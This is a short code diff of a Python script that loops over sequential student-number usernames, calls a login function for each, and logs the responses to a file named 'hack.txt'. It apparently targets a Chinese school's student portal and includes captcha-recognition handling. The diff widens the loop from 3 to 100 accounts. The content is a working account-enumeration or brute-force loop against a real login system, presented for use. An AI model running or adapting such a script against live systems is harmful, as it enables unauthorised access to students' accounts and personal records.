@@ -247,11 +247,10 @@ def login(username):
 
 """"""
 
-for x in range(3):
-    username = 1600816 + x
+for x in range(100):
+    username = 1500700 + x
     hack = login(str(username))
     if (hack != '密码错误 登陆失败'):
-        hack = '验证码识别出错'
         if (hack == '该学生档案已转入存档,不能登录本系统!'):
             with open('hack.txt', 'a') as f:
                 f.write( '\n'+str(username) + hack + '\n')
